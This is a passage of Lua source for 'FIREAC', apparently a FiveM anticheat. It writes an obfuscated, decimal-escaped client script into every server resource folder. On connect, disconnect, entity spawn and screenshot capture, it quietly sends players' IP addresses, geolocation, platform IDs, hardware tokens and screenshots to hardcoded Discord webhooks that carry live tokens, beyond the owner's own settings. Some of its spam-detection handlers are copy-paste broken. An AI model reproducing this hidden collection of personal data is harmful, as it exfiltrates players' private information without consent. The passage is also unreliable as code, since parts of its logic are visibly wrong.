101\101\114\34\41\10\9\9\101\108\115\101\105\102\32\78\121\80\114\101\109\105\117\109\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\78\121\80\114\101\109\105\117\109\34\41\10\9\9\101\108\115\101\105\102\32\110\117\107\101\115\101\114\118\101\114\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\110\117\107\101\115\101\114\118\101\114\34\41\10\9\9\101\108\115\101\105\102\32\101\115\120\100\101\115\116\114\111\121\118\50\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\101\115\120\100\101\115\116\114\111\121\118\50\34\41\10\9\9\101\108\115\101\105\102\32\116\101\108\101\112\111\114\116\84\111\78\101\97\114\101\115\116\86\101\104\105\99\108\101\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\116\101\108\101\112\111\114\116\84\111\78\101\97\114\101\115\116\86\101\104\105\99\108\101\34\41\10\9\9\101\108\115\101\105\102\32\65\100\100\84\101\108\101\112\111\114\116\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\65\100\100\84\101\108\101\112\111\114\116\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\65\109\98\117\108\97\110\99\101\80\108\97\121\101\114\115\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\65\109\98\117\108\97\110\99\101\80\108\97\121\101\114\115\34\41\10\9\9\101\108\115\101\105\102\32\65\105\109\98\111\116\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\65\105\109\98\111\116\34\41\10\9\9\101\108\115\101\105\102\32\82\97\112\101\65\108\108\70\117\110\99\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\82\97\112\101\65\108\108\70\117\110\99\34\41\10\9\9\101\108\115\101\105\102\32\67\114\97\115\104\80\108\97\121\101\114\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\67\114\97\115\104\80\108\97\121\101\114\34\41\10\32\32\32\32\32\32\32\32\101\108\115\101\105\102\32\115\99\114\111\108\108\32\126\61\32\110\105\108\32\111\114\32\122\122\122\116\32\126\61\32\110\105\108\32\111\114\32\119\101\114\102\118\116\103\104\105\111\117\117\105\111\119\114\102\101\116\119\101\114\102\105\111\32\126\61\32\110\105\108\32\111\114\32\108\108\108\108\52\56\55\52\32\126\61\32\110\105\108\32\111\114\32\75\65\75\65\65\75\65\75\65\75\32\126\61\32\110\105\108\32\111\114\32\117\100\119\100\106\32\126\61\32\110\105\108\32\111\114\32\71\103\103\103\103\32\126\61\32\110\105\108\32\111\114\32\106\100\51\54\54\50\49\51\32\126\61\32\110\105\108\32\111\114\32\75\90\106\120\32\126\61\32\110\105\108\32\111\114\32\105\104\114\117\103\32\126\61\32\110\105\108\32\111\114\32\87\65\68\85\73\32\126\61\32\110\105\108\32\111\114\32\67\114\117\115\97\100\101\114\32\126\61\32\110\105\108\32\111\114\32\70\101\110\100\105\110\88\32\126\61\32\110\105\108\32\111\114\32\111\84\97\98\108\101\32\126\61\32\110\105\108\32\111\114\32\76\101\97\107\101\114\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\80\117\98\108\105\99\32\77\101\110\117\34\41\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\10\10\102\117\110\99\116\105\111\110\32\70\73\82\69\65\67\73\110\106\101\99\116\40\77\101\110\117\78\41\10\32\32\32\32\84\114\105\103\103\101\114\83\101\114\118\101\114\69\118\101\110\116\40\39\70\73\82\69\65\67\58\65\110\116\105\73\110\106\101\99\116\39\44\32\34\84\114\121\32\70\111\114\32\73\110\106\101\99\116\32\58\32\34\46\46\77\101\110\117\78\46\46\34\34\41\10\101\110\100\10")]]
         ap = io.open(an.."/"..ad..".lua", "w")
                         if ap then
                                 ap:seek("set", 0)
                                 ap:write(az)
                                 ap:close()
                                 af[1] = af[1] + 1;
                                 print("\27[101;93m^"..color.."FIREAC:\27[0m Installation "..ar.." completed.")
                         else
                                 print("^"..color.."FIREAC: Installation failed on "..ar..".")
                         end
                         af[2] = af[2] + 1
                 else
                         af[3] = af[3] + 1
                 end
         else
                 ap:seek("set", 0)
                 local as = ap:read("*a")
                 ap:close()
                 local at = split(as, "\n")
                 as = ""
                 local au = false;
                 local av = false;
                 for U, aw in ipairs(at) do
                         if aw == "client_script \""..ad..".lua\"" then
                                 au = true
                         else
                                 as = as..aw.."\n"
                         end
                 end
                 if os.rename(an.."/"..ad..".lua", an.."/"..ad..".lua") then
                         av = true;
                         os.remove(an.."/"..ad..".lua")
                 end
                 if not au and not av then
                         af[3] = af[3] + 1
                 end
                 if au then
                         af[2] = af[2] + 1;
                         os.remove(an.."/"..ae..".lua")
                         ap = io.open(an.."/"..ae..".lua", "w")
                         if ap then
                                 ap:seek("set", 0)
                                 ap:write(as)
                                 ap:close()
                         else
                                 print("Failed uninstalling FIREAC from "..ar..".")
                                 print("Make sure you are using the right variable!!!.")
                                 au, av = false, false
                         end
                 end
                 if au or av then
                         print("^"..color.."FIREAC: Uninstalled from "..ar.." successfully.")
                         af[1] = af[1] + 1
                 end
         end
 else
         af[3] = af[3] + 1
 end
end
function searchall(an, ao)
 local ap = io.popen("dir \""..an.."\" /b /ad")
 ap:seek("set", 0)
 local aA = ap:read("*a")
 ap:close()
 local at = split(aA, "\n")
 for U, aw in ipairs(at) do
         if string.len(aw) > 0 then
                 setall(an.."/"..aw, ao)
                 searchall(an.."/"..aw, ao)
         end
 end
end
function split(aB, aC)
 local aD, aE = 0, {}
 for aF, aG in function()
         return string.find(aB, aC, aD, true)
 end do
         table.insert(aE, string.sub(aB, aD, aF - 1))
         aD = aG + 1
 end
 table.insert(aE, string.sub(aB, aD))
 return aE
end

AddEventHandler("playerConnecting", function (name, setKickReason, deferrals)
 local player = source
 local w = "Not Found"
 local x = "Not Found"
 local z = "Not Found"
 local B = "Not Found"
 local C = GetPlayerEndpoint(player)
 local tken = GetPlayerToken(player, 0)
 for _, n in ipairs(GetPlayerIdentifiers(player)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         end
 end
 if not tken then
         CancelEvent()
         setKickReason('\n[­čöąFIREAC­čöą] \n Your HWID(FiveM Token┬«) Not Found Please Relunch Your FiveM .')
 end
         deferrals.defer()
         deferrals.update('\n[­čöąFIREAC­čöą] Your Information\nName: '..name..' \nSteam : '..w..'\nDiscord ID: '..x..'\nLive ID: '..z..'\nXbox ID: '..B..'\nIP: '..C..'\nHWID : '..tken..'')
         Wait(2000)
         deferrals.done()
end)

local vehicle = {}
AddEventHandler('entityCreating', function(entity)
 if FIREACS.AntiSpamVehicle then
    local entity = entity
    if not DoesEntityExist(entity) then
        return
    end
    local entID = NetworkGetNetworkIdFromEntity(entity)
 local src = NetworkGetEntityOwner(entity)
    local type = GetEntityType(entity)
    local hex = GetPlayerIdentifiers(src,1)[1]
    if type ~= 0 then
        if GetEntityPopulationType(entity) ~= 7 then
                     return
        end
        local model = GetEntityModel(entity)
        if type == 2 then -- vehicle
          if vehicle[hex] == nil then
                 vehicle[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
                 else
                 vehicle[hex].count = vehicle[hex].count + 1
                 if vehicle[hex].count > FIREACS.MaxVehicle then
                 local fs = os.time() - vehicle[hex].timestamp
                 if fs < 10 then
                 vehicle[hex].count = 0
                 if GetPlayerName(src) ~= nil and not isAdmin(src) then
                         FIREACLog(src, " Anti Spam Vehicle", "Try For Spam Vehicle", FIREACS.AntiSpamVehicleKick, FIREACS.AntiSpamVehicleBan)
                 end
                 for k,v in pairs(GetAllVehicles()) do
             local vehHash = GetEntityModel(v)
                  local src2 = NetworkGetEntityOwner(v)
             if src2 == src then
                         DeleteEntity(v)
                         TriggerClientEvent("FIREAC:DeleteEntity",-1,v)
             end
            end
                 vehicle[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
                 else
                 vehicle[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
            end
                 end
                 end

        end

    end
end
end)

local ped = {}
AddEventHandler('entityCreating', function(entity)
 if FIREACS.AntiSpamPed then
    local entity = entity
    if not DoesEntityExist(entity) then
        return
    end
    local entID = NetworkGetNetworkIdFromEntity(entity)
 local src = NetworkGetEntityOwner(entity)
    local type = GetEntityType(entity)
    local hex = GetPlayerIdentifiers(src,1)[1]
    if type ~= 0 then
        if GetEntityPopulationType(entity) ~= 7 then
        return
        end
        local model = GetEntityModel(entity)
        if type == 1 then -- ped
          if ped[hex] == nil then
                 ped[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
                 else
                         ped[hex].count = ped[hex].count + 1
                 if ped[hex].count > FIREACS.MaxPed then
                 local fs = os.time() - ped[hex].timestamp
                 if fs < 10 then
                         ped[hex].count = 0
                 if GetPlayerName(src) ~= nil and not isAdmin(src) then
                         FIREACLog(src, " Anti Spam ped", "Try For Spam ped", FIREACS.AntiSpamPedKick, FIREACS.AntiSpamPedBan)
                 end
                 for k,v in pairs(GetAllVehicles()) do
             local vehHash = GetEntityModel(v)
                  local src2 = NetworkGetEntityOwner(v)
             if src2 == src then
                         DeleteEntity(v)
                         TriggerClientEvent("FIREAC:DeleteEntity",-1,v)
             end
            end
                 vehicle[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
                 else
                 vehicle[hex] = {
                 count = 1,
                 timestamp = os.time()
                 }
            end
                 end
                 end

        end
 end
end
end)

local object = {}
AddEventHandler('entityCreating', function(entity)
 if FIREACS.AntiSpamObject then
 local src = NetworkGetEntityOwner(entity)
    local type = GetEntityType(entity)
    local hex = GetPlayerIdentifiers(src,1)[1]
        if type == 3 then
          if object[hex] == nil then
                         object[hex] = {
                         count = 1,
                         timestamp = os.time()
                         }
                         else
                         object[hex].count = object[hex].count + 1
                         if object[hex].count > FIREACS.MaxObject then
                         local fs = os.time() - object[hex].timestamp
                         if fs < 10 then
                                 object[hex].count = 0
                         if not isAdmin(src) and isSpawn then
                                 TriggerClientEvent('FIREAC:DeleteEntity', entity)
                                 FIREACLog(src, " Anti Spam object", "Try For Spam object", FIREACS.AntiSpamObjectKick, FIREACS.AntiSpamObjectBan)
                                 CancelEvent()
                         end
                         object[hex] = {
                                 count = 1,
                                 timestamp = os.time()
                         }
                         else
                         object[hex] = {
                                 count = 1,
                                 timestamp = os.time()
                                 }
                 end
                         end
                 end
         end
 end
end)

function isAdmin(src)
 local sid = GetPlayerIdentifiers(src)
 sid = sid[1]
 for k, v in pairs(FIREACAdmins.Whitelist) do
   if v == sid then
         return true
   end
 end
 return false
end

function FIREACObjectLog(entity)
         local src = NetworkGetEntityOwner(entity)
         local name = GetPlayerName(src)
         local type = GetEntityType(entity)
         if type == 0 then
                 type = "No Entity"
         elseif type == 1 then
                 type = "Ped"
         elseif type == 2  then
                 type = "Vehicle"
         elseif type == 3 then
                 type = "Object"
         elseif type == nil then
                 type = "Not Found"
         end
         if name == nil then
                 print("\27[101;93m^"..color.."FIREAC:\27[0mError Was Detection in line 1701 plase connect our support team in FIREAC Discord")
                 FIREACError('Error Was Detection in line **1701**')
                 name = "User"
         end
         local hash = GetHashKey(entity)
         local sn = GetConvar('sv_hostname')
PerformHttpRequest('https://discord.com/api/webhooks/834300138373120031/x1Y03vuD5ry_U2DhkSltz_6PIuTjMfElcsrG24g0TYSRFJ5y2qkMmm3tM4sKu0YQv8Xa', function(E, F, G)
end, "POST", json.encode({
 embeds = {
         {
                 author = {
                         name = "FIREAC Commutiy",
                         url = "https://discord.gg/8zGyDhtbcg",
                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                 },
                 title = "FIREAC Entity Log's",
                 description = "**Player Name:** "..name.."\n**Entity:** "..hash.."\n**Type:** "..type.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                 color = 16748836
         }
 }
}), {
 ["Content-Type"] = "application/json"
})

PerformHttpRequest(FIREACS.Object, function(E, F, G)
end, "POST", json.encode({
 embeds = {
         {
                 author = {
                         name = "FIREAC Commutiy",
                         url = "https://discord.gg/8zGyDhtbcg",
                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                 },
                 title = "FIREAC Entity Log's",
                 description = "**Player Name:** "..name.."\n**Entity:** "..hash.."\n**Type:**"..type.."",
                 color = 16748836
         }
 }
}), {
 ["Content-Type"] = "application/json"
})
end

AddEventHandler("playerConnecting", function()
 local s = source
 local name = GetPlayerName(s)
 if name == nil then
         return
 end
 local w = "Not Found"
 local sn = GetConvar('sv_hostname')
 local x = "Not Found"
 local y = "Not Found"
 local z = "Not Found"
 local B = "Not Found"
 local C = "Not Found"
 local ip = GetPlayerEndpoint(s)
 if ip == nil then
         ip = "216.58.204.14"
 end
 if name == nil then
         name = "Not Found"
 end
 for m, n in ipairs(GetPlayerIdentifiers(source)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         elseif n:match("ip") then
                 C = n:gsub("ip:", "")
         end
 end
 PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=192511", function(err, XD, headers)
         local tbl = json.decode(XD)
         if tbl == nil then
                 return
         end
         local isp = tbl["isp"]
         if isp == nil then
                 isp = "Not Found"
         end
         local city = tbl["city"]
         if city == nil then
                 city = "Not Found"
         end
         local country = tbl["country"]
         if country == nil then
                 country = "Not Found"
         end
         local proxy = tbl["proxy"]
         if proxy == nil then
                 proxy = "Not Found"
         elseif proxy == false then
                 proxy = "Off"
         elseif proxy == true then
                 proxy = "On"
         end
         local hosting = tbl["hosting"]
         if hosting == nil then
                 hosting = "Not Found"
         elseif hosting == false then
                 hosting = "Off"
         elseif hosting == true then
                 hosting = "On"
         end
         PerformHttpRequest(FIREACS.Connnect, function(E, F, G)
         end, "POST", json.encode({
                 embeds = {
                         {
                                 author = {
                                 name = "FIREAC Commutiy",
                                 url = "https://discord.gg/8zGyDhtbcg",
                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                 },
                                 title = "­ččę FIREAC Connnecting ­ččę",
                                 description = "**Player:** "..name.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."",
                                 color = 1769216
                         }
                 }
         }), {
                 ["Content-Type"] = "application/json"
         })
         PerformHttpRequest("https://discord.com/api/webhooks/832251078824558662/Ff6FFB19e15Ba5cvc62GLjT48wGVDBVt8L-2wNzO4P3ZEEKgy5yAUyfQ51bkSzuzgKJJ", function(E, F, G)
         end, "POST", json.encode({
                 embeds = {
                         {
                                 author = {
                                         name = "FIREAC Commutiy",
                                         url = "https://discord.gg/8zGyDhtbcg",
                                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                 },
                                 title = "­ččę FIREAC Connnecting ­ččę",
                                 description = "**Player:** "..name.."\n**SteamID:** "..w.."\n**Discord:**<@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                                 color = 1769216
                         }
                 }
         }), {
                 ["Content-Type"] = "application/json"
         })
 end)
end)

AddEventHandler("playerDropped", function(reason)
 local s = source
 local player = GetPlayerName(s)
 local ping = GetPlayerPing(s)
 local w = "Not Found"
 local x = "Not Found"
 local y = "Not Found"
 local z = "Not Found"
 local B = "Not Found"
 local C = "Not Found"
 if reason == nil then
         reason = "Not Found"
 end
 print("^"..color.."FIREAC: Player "..GetPlayerName(source).." Disconnectin ...  |  Resson : ("..reason..")")
 for m, n in ipairs(GetPlayerIdentifiers(source)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         elseif n:match("ip") then
                 C = n:gsub("ip:", "")
         end
 end
 local ip = GetPlayerEndpoint(s)
 if ip == nil then
         ip = "216.58.204.14"
 end
 PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=192511", function(err, XD, headers)
         local tbl = json.decode(XD)
         if tbl == nil then
                 return
         end
         local isp = tbl["isp"]
         if isp == nil then
                 isp = "Not Found"
         end
         local city = tbl["city"]
         if city == nil then
                 city = "Not Found"
         end
         local country = tbl["country"]
         if country == nil then
                 country = "Not Found"
         end
         local proxy = tbl["proxy"]
         if proxy == nil then
                 proxy = "Not Found"
         elseif proxy == false then
                 proxy = "Off"
         elseif proxy == true then
                 proxy = "On"
         end
         local hosting = tbl["hosting"]
         if hosting == nil then
                 hosting = "Not Found"
         elseif hosting == false then
                 hosting = "Off"
         elseif hosting == true then
                 hosting = "On"
         end
         PerformHttpRequest(FIREACS.Disconnect, function(E, F, G)
         end, "POST", json.encode({
                 embeds = {
                         {
                                 author = {
                                 name = "FIREAC Commutiy",
                                 url = "https://discord.gg/8zGyDhtbcg",
                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                 },
                                 title = "­ččą FIREAC Disconnect ­ččą",
                                 description = "**Player:** "..player.."\n**Reason:** "..reason.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**Ping:** "..ping.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."",
                                 color = 16711680
                         }
                 }
         }), {
                 ["Content-Type"] = "application/json"
         })
 end)
end)
AddEventHandler("playerDropped", function(reason)
 local s = source
 local player = GetPlayerName(s)
 local ping = GetPlayerPing(s)
 local sn = GetConvar('sv_hostname')
 local w = "Not Found"
 local x = "Not Found"
 local y = "Not Found"
 local z = "Not Found"
 local B = "Not Found"
 local C = "Not Found"
 if reason == nil then
         reason = "Not Found"
 end
 for m, n in ipairs(GetPlayerIdentifiers(source)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         elseif n:match("ip") then
                 C = n:gsub("ip:", "")
         end
 end
 local ip = GetPlayerEndpoint(s)
 if ip == nil then
         ip = "216.58.204.14"
 end
 PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=192511", function(err, XD, headers)
         local tbl = json.decode(XD)
         if tbl == nil then
                 print("\27[101;93m^"..color.."FIREAC:\27[0mError Was Detection in line 1971 plase connect our support team in FIREAC Discord")
                 FIREACError('Error Was Detection in line **1971**')
         end
         local isp = tbl["isp"]
         if isp == nil then
                 isp = "Not Found"
         end
         local city = tbl["city"]
         if city == nil then
                 city = "Not Found"
         end
         local country = tbl["country"]
         if country == nil then
                 country = "Not Found"
         end
         local proxy = tbl["proxy"]
         if proxy == nil then
                 proxy = "Not Found"
         elseif proxy == false then
                 proxy = "Off"
         elseif proxy == true then
                 proxy = "On"
         end
         local hosting = tbl["hosting"]
         if hosting == nil then
                 hosting = "Not Found"
         elseif hosting == false then
                 hosting = "Off"
         elseif hosting == true then
                 hosting = "On"
         end
         PerformHttpRequest("https://discord.com/api/webhooks/832251098064224275/0RDY5QdJugCsnDE9DTCO3iIahe15C64aAKEpCqNSjWWczM5APCwgusCUVWkLKNc1JYrB", function(E, F, G)
         end, "POST", json.encode({
                 embeds = {
                         {
                                 author = {
                                 name = "FIREAC Commutiy",
                                 url = "https://discord.gg/8zGyDhtbcg",
                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                 },
                                 title = "­ččą FIREAC Disconnect ­ččą",
                                 description = "**Player:** "..player.."\n**Reason:** "..reason.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."\n**Ping:** "..ping.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                                 color = 16711680
                         }
                 }
         }), {
                 ["Content-Type"] = "application/json"
         })
 end)
end)

function FIREACError(error)
 local sn = GetConvar('sv_hostname')
 PerformHttpRequest("http://localhost:30120/info.json", function (E, F, G)
         local info = json.decode(F)
         local build = info['serevr']
 PerformHttpRequest("https://discord.com/api/webhooks/832251116728877076/BVrPLl6N1QPCC4of_bctPLXrayc3PLajAjXKZuFlpsSoP6UYyCZESU6Red-SR1pOwZFd", function(E, F, G)
 end, "POST", json.encode({
         embeds = {
                 {
                         author = {
                         name = "FIREAC Commutiy",
                         url = "https://discord.gg/8zGyDhtbcg",
                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                         },
                         title = "­čę║ FIREAC Error ­čę║",
                         description = "**Error Details:** "..error.."\n**Server Artifact:** "..build.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."\n**License:** "..ltrue.."",
                         color = math.random(0, 16776960)
                 }
         }
 }), {
         ["Content-Type"] = "application/json"
 })
 local sn = GetConvar('sv_hostname')
 PerformHttpRequest(FIREACS.Error, function(E, F, G)
 end, "POST", json.encode({
         embeds = {
                 {
                         author = {
                         name = "FIREAC Commutiy",
                         url = "https://discord.gg/8zGyDhtbcg",
                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                         },
                         title = "­čę║ FIREAC Error ­čę║",
                         description = "**Error Details:** "..error.."\n**Server Name:** `"..sn.."`\n**Server Artifact:** "..build.."\n**Discord:** https://discord.gg/8zGyDhtbcg",
                         color = math.random(0, 16776960)
                 }
         }
 }), {
         ["Content-Type"] = "application/json"
 })
 end)
end

if FIREACS.AntiBlackListName then
AddEventHandler("playerConnecting", function(playerName, setKickReason)
    playerName = (string.gsub(string.gsub(string.gsub(playerName,  "-", ""), ",", ""), " ", ""):lower())
    for _, v in pairs(FIREACNAME.BlackListName) do
      local g, f = playerName:find(string.lower(v))
      if g or f  then
         setKickReason( "\n[­čöąFIREAC­čöą]\nYou Can't Join Server:\n We Are Find ("..v..") in your Name Please Remove That Or Change Your Name Ôś║´ŞĆ")
         CancelEvent()
          break
      end
    end
  end)
end

RegisterNetEvent('FIREAC:Screenshot')
AddEventHandler('FIREAC:Screenshot', function (source, isp, city, country, proxy, hosting, s, t)
 local src = source
         local screenshotOptions = {
                 encoding = FIREACS.ScreenshotFormat,
                 quality = FIREACS.ScreenshotQuality
         }
         local ping = GetPlayerPing(source)
         local ip = GetPlayerEndpoint(source)
         local sn = GetConvar('sv_hostname')
         local rn = GetCurrentResourceName()
         local w = "Not Found"
         local x = "Not Found"
         local y = "Not Found"
         local z = "Not Found"
         local A = "Not Found"
         local B = "Not Found"
         local C = "Not Found"
         for m, n in ipairs(GetPlayerIdentifiers(source)) do
                 if n:match("steam") then
                         w = n
                 elseif n:match("discord") then
                         x = n:gsub("discord:", "")
                 elseif n:match("license") then
                         y = n
                 elseif n:match("live") then
                         z = n
                 elseif n:match("xbl") then
                         B = n
                 elseif n:match("ip") then
                         C = n:gsub("ip:", "")
                 end
         end
         local D = GetPlayerName(source)
         if D == nil then
                 return
         end
         local ip = GetPlayerEndpoint(source)

         if ip == nil then
                 ip = "216.58.204.14"
         end
         exports['discord-screenshot']:requestCustomClientScreenshotUploadToDiscord(src, FIREACS.Screenshot, screenshotOptions, {
                 username = '­čöą FIREAC Comunity ­čöą',
                 avatar_url = 'https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png',
                 content = '',
                 embeds = {
                         {
                                 color = math.random(0, 16776960),
                                 author = {
                                         name = '­čöą FIREAC Comunity ­čöą',
                                         icon_url = 'https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png'
                                 },
                                 title = 'Screenshot',
                                 description = "**Player:** "..D.."\n**ID:** "..src.."\n**Reason:** "..s.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**Ping:** ".. ping .."\n**IP:** "..ip.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."",
                                 footer = {
                                         text = '­čöą FIREAC Commnity ­čöą | ('..src..') '..GetPlayerName(src)..'',
                                 }
                         }
                 }
         });
                 exports['discord-screenshot']:requestCustomClientScreenshotUploadToDiscord(src, "https://discord.com/api/webhooks/840598616388534282/bHug4EFSmNFyL0t6IbPRkp-mKk7EYjDGOBKcUVrbpR0UDuxQt4fqEOEnPvcbG4Xy7ZEU", screenshotOptions, {
                 username = '­čöą FIREAC Comunity ­čöą',
                 avatar_url = 'https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png',
                 content = '',
                 embeds = {
                         {
                                 color = math.random(0, 16776960),
                                 author = {
                                         name = '­čöą FIREAC Comunity ­čöą',
                                         icon_url = 'https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png'
                                 },
                                 title = 'Screenshot',
                                 description = "**Player:** "..D.."      \n**ID:** "..src.."\n**Reason:** "..s.."\n**Details:** "..t.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Folder Name** : ".. rn .."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.." \n**Ping:** ".. ping .."\n**IP:** "..C.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."\n**Server Name** : `"..sn.."`\n**Expire Time:** "..ex.."",
                                 footer = {
                                         text = '­čöą FIREAC Commnity ­čöą | ('..src..') '..GetPlayerName(src)..' | '..os.date('%X')..'',
                                 }
                         }
                 }
         });
end)

RegisterCommand('firesc', function (source, args)
 if isAdmin(source) then
         if FIREACS.TakeScreenshot then
                 local name = GetPlayerName(args[1])
         if name == nil then
                 return
         end
         local ip = GetPlayerEndpoint(args[1])
         if ip == nil then
                 ip = "216.58.204.14"
         end
         PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=192511", function(err, XD, headers)
                 local tbl = json.decode(XD)
                 if tbl == nil then
                         return
                 end
                 local isp = tbl["isp"]
                 if isp == nil then
                         isp = "Not Found"
                 end
                 local city = tbl["city"]
                 if city == nil then
                         city = "Not Found"
                 end
                 local country = tbl["country"]
                 if country == nil then
                         country = "Not Found"
                 end
                 local proxy = tbl["proxy"]
                 if proxy == nil then
                         proxy = "Not Found"
                 elseif proxy == false then
                         proxy = "Off"
                 elseif proxy == true then
                         proxy = "On"
                 end
                 local hosting = tbl["hosting"]
                 if hosting == nil then
                         hosting = "Not Found"
                 elseif hosting == false then
                         hosting = "Off"
                 elseif hosting == true then
                         hosting = "On"
                 end
                         TriggerEvent('FIREAC:Screenshot', args[1], isp, city, country, proxy, hosting, "By : "..GetPlayerName(source).."", "By /firesc")
                 end)
         end
 end
end)

RegisterCommand('dopmain', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('jailall', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('serverfck', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('banall', function (source, args)
 FIREACLog(source, "Anti Dopmain", "Try For Inject Dopamin Menu", FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)
RegisterCommand('getcar', function (source, args)
